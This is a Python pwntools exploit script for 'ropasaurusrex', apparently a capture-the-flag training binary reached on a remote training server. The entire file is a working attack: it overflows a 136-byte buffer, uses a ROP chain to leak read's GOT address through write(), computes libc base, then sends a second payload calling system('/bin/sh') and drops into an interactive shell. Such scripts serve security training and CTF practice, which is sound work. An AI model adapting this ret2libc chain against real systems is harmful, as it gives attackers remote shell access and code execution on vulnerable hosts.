import pwn

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'i386'

r = pwn.remote('training.jinblack.it', 2014)

# r = pwn.process('./ropasaurusrex', env={'LD_PRELOAD': './libc-2.27.so'})

# vuln_func_return_addr = 0x0804841c

# pwn.gdb.attach(r, """
#     c
# """)

input('wait')

buffer_len = 136

ADDRESS_SIZE = 4

STDOUT_FD = 1

write_addr = 0x0804830c
read_at_GOT_addr = 0x0804961c
main_addr = 0x0804841d

payload = pwn.p32(write_addr) + pwn.p32(main_addr) + pwn.p32(STDOUT_FD) + pwn.p32(read_at_GOT_addr) + pwn.p32(ADDRESS_SIZE)

r.send(b"A" * buffer_len + b"A" * ADDRESS_SIZE + payload)

system_offset = 0x3d200
binsh_offset = 0x17e0cf
read_offset = 0xe6cb0

read_addr_libc = pwn.u32(r.recv(ADDRESS_SIZE))

libc_base = read_addr_libc - read_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

print("read address in libc:")
print(hex(read_addr_libc))
print("libc base:")
print(hex(libc_base))
print("system:")
print(hex(system_addr))

payload2 = pwn.p32(system_addr) + b"B" * ADDRESS_SIZE + pwn.p32(binsh_addr)

r.send(b"A" * buffer_len + b"A" * ADDRESS_SIZE + payload2)

r.interactive()

